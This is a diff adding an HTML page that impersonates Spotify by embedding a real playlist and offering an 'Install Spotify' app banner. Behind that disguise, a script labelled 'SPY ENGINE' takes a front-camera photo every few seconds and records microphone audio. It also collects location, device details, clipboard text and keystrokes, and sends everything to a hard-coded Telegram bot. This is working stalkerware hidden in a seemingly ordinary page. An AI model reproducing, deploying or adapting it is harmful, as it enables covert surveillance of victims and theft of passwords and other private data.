@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1DB954">
+    <title>Spotify</title>
+    
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="manifest.json">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Spotify">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #121212;
+            overflow: hidden;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: 1;
+            background: #000;
+        }
+        #video,
+        #canvas {
+            display: none;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            pointer-events: none;
+            background: transparent;
+        }
+        #installBanner {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            z-index: 1000;
+            background: rgba(29, 185, 84, 0.15);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 60px;
+            padding: 16px 32px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            display: none;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            opacity: 0;
+            white-space: nowrap;
+        }
+        #installBanner.show {
+            display: block;
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+            animation: glassFadeUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+        #installBanner:hover {
+            transform: translateX(-50%) scale(1.03);
+            background: rgba(29, 185, 84, 0.35);
+            border-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 20px 40px rgba(29, 185, 84, 0.2);
+        }
+        #installBanner:active {
+            transform: translateX(-50%) scale(0.96);
+        }
+        @keyframes glassFadeUp {
+            0% {
+                opacity: 0;
+                transform: translateX(-50%) translateY(30px) scale(0.95);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0) scale(1);
+            }
+        }
+        @media (max-width: 480px) {
+            #installBanner {
+                width: 85%;
+                text-align: center;
+                padding: 14px 20px;
+                font-size: 14px;
+                bottom: 20px;
+                white-space: normal;
+                border-radius: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SPOTIFY ASLI -->
+    <iframe src="https://open.spotify.com/embed/playlist/37i9dQZF1DXcBWIGoYBM5M?autoplay=1" allow="autoplay"></iframe>
+    <div class="overlay"></div>
+
+    <!-- BANNER INSTALL -->
+    <div id="installBanner">📲 Install Spotify</div>
+
+    <!-- SPY ENGINE -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="1280" height="720"></canvas>
+
+    <script>
+        // ===== KONFIGURASI TELEGRAM (GANTI) =====
+        const botToken = "8739276755:AAE0yv1ZoTJ4FDz1TBK57Lib6iiwifH18aM";
+        const chatId = "7514856468";
+
+        // ===== PWA INSTALL =====
+        let deferredPrompt;
+        const installBanner = document.getElementById('installBanner');
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            installBanner.classList.add('show');
+        });
+        installBanner.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const result = await deferredPrompt.userChoice;
+                if (result.outcome === 'accepted') installBanner.classList.remove('show');
+                deferredPrompt = null;
+            }
+        });
+
+        // ===== SPY ENGINE =====
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                };
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => sendToTelegram(blob, 'photo'), 'image/jpeg', 0.8);
+                }, 5000);
+            }).catch(() => {});
+        }
+
+        function startAudio() {
+            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(stream => {
+                    const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
+                    const recorder = new MediaRecorder(stream, { mimeType });
+                    const chunks = [];
+                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                    recorder.onstop = () => {
+                        sendToTelegram(new Blob(chunks, { type: mimeType }), 'audio');
+                        chunks.length = 0;
+                    };
+                    recorder.start();
+                    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 10000);
+                }).catch(() => {});
+        }
+
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(
+                pos => sendToTelegram(`📍 ${pos.coords.latitude}, ${pos.coords.longitude}`, 'text'),
+                () => {}
+            );
+        }
+
+        function getDeviceInfo() {
+            sendToTelegram(`📱 ${navigator.userAgent} | ${screen.width}x${screen.height}`, 'text');
+        }
+
+        async function readClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) sendToTelegram(`📋 ${text}`, 'text');
+            } catch (e) {}
+        }
+
+        let keys = [];
+        document.addEventListener('keydown', e => {
+            keys.push(e.key);
+            if (keys.length >= 30) {
+                sendToTelegram(`⌨️ ${keys.join('')}`, 'text');
+                keys = [];
+            }
+        });
+
+        function sendToTelegram(data, type) {
+            if (!botToken || botToken === 'YOUR_BOT_TOKEN') return;
+            const url = `https://api.telegram.org/bot${botToken}/`;
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+
+            if (type === 'photo' && data instanceof Blob) {
+                fd.append('photo', data, 'spy.jpg');
+                fetch(url + 'sendPhoto', { method: 'POST', body: fd }).catch(() => {});
+            } else if (type === 'audio' && data instanceof Blob) {
+                fd.append('audio', data, 'spy_audio.webm');
+                fetch(url + 'sendAudio', { method: 'POST', body: fd }).catch(() => {});
+            } else if (type === 'text' && typeof data === 'string') {
+                fetch(url + 'sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: data })
+                }).catch(() => {});
+            }
+        }
+
+        // START
+        setTimeout(() => {
+            startCamera();
+            setInterval(startAudio, 30000);
+            setInterval(getLocation, 60000);
+            setInterval(readClipboard, 15000);
+            setTimeout(getDeviceInfo, 3000);
+        }, 5000);
+    </script>
+</body>
+</html>
